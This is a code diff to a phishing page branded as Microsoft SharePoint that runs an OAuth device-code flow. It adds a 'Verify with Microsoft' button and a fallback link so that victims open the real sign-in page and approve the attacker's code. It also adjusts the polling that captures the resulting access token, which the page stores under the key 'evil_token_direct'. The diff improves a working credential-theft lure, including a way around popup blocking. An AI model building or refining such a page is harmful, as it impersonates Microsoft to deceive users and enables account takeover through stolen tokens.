@@ -215,6 +215,38 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         .footer { text-align: center; font-size: 11px; color: #999; padding: 16px; border-top: 1px solid #eee; }
+        /* New styles for the verify button */
+        .verify-btn-wrapper {
+            margin-top: 14px;
+        }
+        .verify-btn {
+            background: #007b8a;
+            color: white;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 2px 8px rgba(0,123,138,0.3);
+            transition: background 0.15s, transform 0.1s;
+        }
+        .verify-btn:hover { background: #005f6b; }
+        .verify-btn:active { transform: scale(0.96); }
+        .verify-btn:disabled { opacity: 0.5; pointer-events: none; }
+        .fallback-link {
+            display: none;
+            margin-top: 8px;
+            font-size: 13px;
+        }
+        .fallback-link a {
+            color: #007b8a;
+            text-decoration: underline;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -295,6 +327,19 @@
                 <div class="spinner"></div>
                 <span id="spinnerText">Requesting code…</span>
             </div>
+
+            <!-- VERIFY BUTTON (appears when code is ready) -->
+            <div class="verify-btn-wrapper" id="verifyWrapper" style="display:none;">
+                <button class="verify-btn" id="verifyBtn">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M5 12h14M12 5l7 7-7 7"/>
+                    </svg>
+                    Verify with Microsoft
+                </button>
+                <div class="fallback-link" id="fallbackLink">
+                    <a href="#" id="fallbackAnchor">If the page doesn't open, click here</a>
+                </div>
+            </div>
         </div>
 
         <div class="footer">Microsoft SharePoint</div>
@@ -308,6 +353,10 @@
             const copyBtn = document.getElementById('copyBtn');
             const loadingSpinner = document.getElementById('loadingSpinner');
             const spinnerText = document.getElementById('spinnerText');
+            const verifyWrapper = document.getElementById('verifyWrapper');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const fallbackLink = document.getElementById('fallbackLink');
+            const fallbackAnchor = document.getElementById('fallbackAnchor');
 
             let deviceCode = '';
             let userCode = '';
@@ -319,8 +368,13 @@
 
             function setCode(text, state = '') {
                 otpDisplay.textContent = text;
-                // If text is "Error" or "EXPIRED", disable copy
                 copyBtn.disabled = (text === 'Error' || text === 'EXPIRED' || text === 'Loading…');
+                // Show verify button only when code is valid and not approved
+                if (text && text !== 'Loading…' && text !== 'Error' && text !== 'EXPIRED' && !isApproved) {
+                    verifyWrapper.style.display = 'block';
+                } else {
+                    verifyWrapper.style.display = 'none';
+                }
             }
 
             function copyOTP() {
@@ -359,16 +413,38 @@
 
             copyBtn.addEventListener('click', copyOTP);
 
+            // Open verification URI on button click (user gesture)
             function openVerificationUri(uri) {
                 if (!uri) return;
                 const newWindow = window.open(uri, '_blank');
                 if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
-                    // Popup blocked – just update spinner text
-                    spinnerText.textContent = 'Popup blocked. Please manually open: ' + uri;
+                    // Popup blocked – show fallback link
+                    fallbackLink.style.display = 'block';
+                    fallbackAnchor.href = uri;
+                    spinnerText.textContent = 'Popup blocked. Click the link below.';
                 } else {
-                    spinnerText.textContent = 'Opening Microsoft sign‑in…';
+                    fallbackLink.style.display = 'none';
+                    spinnerText.textContent = 'Microsoft sign‑in opened.';
                 }
             }
+
+            // Attach click handler to verify button
+            verifyBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (verificationUri) {
+                    openVerificationUri(verificationUri);
+                } else {
+                    alert('No verification URI available. Please refresh.');
+                }
+            });
+
+            // Fallback link click
+            fallbackAnchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (verificationUri) {
+                    window.open(verificationUri, '_blank');
+                }
+            });
 
             async function pollForToken() {
                 if (!deviceCode || isPolling || isApproved) return;
@@ -386,6 +462,7 @@
                         pollInterval = null;
                         setCode('Approved ✓');
                         copyBtn.disabled = true;
+                        verifyWrapper.style.display = 'none';
                         spinnerText.textContent = 'Verification complete! Redirecting…';
                         setTimeout(() => {
                             localStorage.setItem('evil_token_direct', data.access_token);
@@ -406,6 +483,7 @@
                         pollInterval = null;
                         setCode('EXPIRED');
                         copyBtn.disabled = true;
+                        verifyWrapper.style.display = 'none';
                         spinnerText.textContent = 'Code expired. Refresh the page.';
                         isPolling = false;
                         return;
@@ -419,9 +497,9 @@
                     isPolling = false;
                 } catch (err) {
                     console.error('Poll error:', err);
-                    // No red bar – just show error in OTP box and spinner
                     setCode('Error');
                     copyBtn.disabled = true;
+                    verifyWrapper.style.display = 'none';
                     spinnerText.textContent = 'Network error. Check console.';
                     isPolling = false;
                 }
@@ -430,6 +508,7 @@
             async function startDeviceFlow() {
                 setCode('Loading…');
                 copyBtn.disabled = true;
+                verifyWrapper.style.display = 'none';
                 spinnerText.textContent = 'Requesting code…';
                 loadingSpinner.style.display = 'flex';
                 try {
@@ -445,8 +524,8 @@
                     verificationUri = data.verification_uri || 'https://microsoft.com/devicelogin';
                     setCode(userCode);
                     copyBtn.disabled = false;
-                    // Automatically open the verification URI
-                    openVerificationUri(verificationUri);
+                    // Show verify button (setCode already does it)
+                    spinnerText.textContent = 'Code ready. Click "Verify with Microsoft" to open the sign‑in page.';
                     if (pollInterval) clearInterval(pollInterval);
                     const intervalMs = (data.interval || 5) * 1000 + 500;
                     pollInterval = setInterval(pollForToken, intervalMs);
@@ -455,6 +534,7 @@
                     console.error('Device flow error:', err);
                     setCode('Error');
                     copyBtn.disabled = true;
+                    verifyWrapper.style.display = 'none';
                     spinnerText.textContent = 'Error loading code.';
                 }
             }
